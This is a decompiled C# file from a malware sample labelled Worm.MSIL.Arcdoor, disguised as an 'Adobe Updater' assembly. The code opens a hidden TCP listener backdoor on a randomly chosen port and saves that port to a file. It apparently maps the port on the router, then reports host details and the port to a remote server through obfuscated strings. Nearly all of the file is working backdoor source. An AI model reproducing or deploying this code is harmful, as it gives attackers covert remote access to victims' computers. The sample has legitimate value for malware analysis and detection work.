// Decompiled with JetBrains decompiler
// Type:  
// Assembly: Adobe Updater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3EBFD65F-C01D-4B08-A6E5-41C787EE6341
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Worm.MSIL.Arcdoor.vps-5c5e242af096e77e0fc4a037a0fee5d20df072b9dc640e5ae36ec0f0f68ad065.exe

using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;

public sealed class \u0002\u2001
{
  private static Random \u0002 = new Random();

  public static void \u0002()
  {
    if (\u0002\u2001.\u0002())
    {
      StreamWriter streamWriter = new StreamWriter(Environment.GetEnvironmentVariable(\u000F\u2001.\u0002(670213795)) + \u000F\u2001.\u0002(670213803) + \u000E\u2001.\u0005\u2000 + \u000F\u2001.\u0002(670212900));
      streamWriter.WriteLine(\u0002\u2001.\u0002.Next(2000, 20000));
      streamWriter.Close();
    }
    int int32 = Convert.ToInt32(new StreamReader(Environment.GetEnvironmentVariable(\u000F\u2001.\u0002(670213795)) + \u000F\u2001.\u0002(670213803) + \u000E\u2001.\u0005\u2000 + \u000F\u2001.\u0002(670212900)).ReadLine());
    new Thread(new ThreadStart(\u0002\u2001.\u0003)).Start();
    Thread.Sleep(5000);
    TcpListener tcpListener = new TcpListener(int32);
    new Thread(new ThreadStart(\u0002\u2001.\u0005)).Start();
    tcpListener.Start();
    while (true)
      new Thread(new ThreadStart(new \u0003(tcpListener.AcceptTcpClient()).\u0002)).Start();
  }

  public static void \u0003()
  {
    try
    {
      int int32 = Convert.ToInt32(new StreamReader(Environment.GetEnvironmentVariable(\u000F\u2001.\u0002(670213795)) + \u000F\u2001.\u0002(670213803) + \u000E\u2001.\u0005\u2000 + \u000F\u2001.\u0002(670212900)).ReadLine());
      \u0006\u2001.\u0002();
      \u0006\u2001.\u0002(int32, int32, \u000F\u2001.\u0002(670212915), \u000F\u2001.\u0002(670212941));
    }
    catch
    {
    }
  }

  public static void \u0005()
  {
    Thread.Sleep(10000);
    int int32 = Convert.ToInt32(new StreamReader(Environment.GetEnvironmentVariable(\u000F\u2001.\u0002(670213795)) + \u000F\u2001.\u0002(670213803) + \u000E\u2001.\u0005\u2000 + \u000F\u2001.\u0002(670212900)).ReadLine());
    try
    {
      \u000F\u2000.\u0002(\u0002.\u0006(), int32, \u000F\u2001.\u0002(670212958), (ushort) 80, \u000E\u2001.\u0002\u2000, \u000E\u2001.\u0003\u2000);
      string str = \u000F\u2001.\u0002(670212963) + \u0002.\u000E() + \u000F\u2001.\u0002(670212991) + \u0002.\u0005() + \u000F\u2001.\u0002(670213727) + \u0006\u2001.\u0002() + \u000F\u2001.\u0002(670212746) + (object) int32;
      \u0005\u2000.\u0002(\u000E\u2001.\u0006, str);
    }
    catch
    {
    }
  }

  public static bool \u0002() => !File.Exists(Environment.GetEnvironmentVariable(\u000F\u2001.\u0002(670213795)) + \u000F\u2001.\u0002(670213803) + \u000E\u2001.\u0005\u2000 + \u000F\u2001.\u0002(670212900));
}
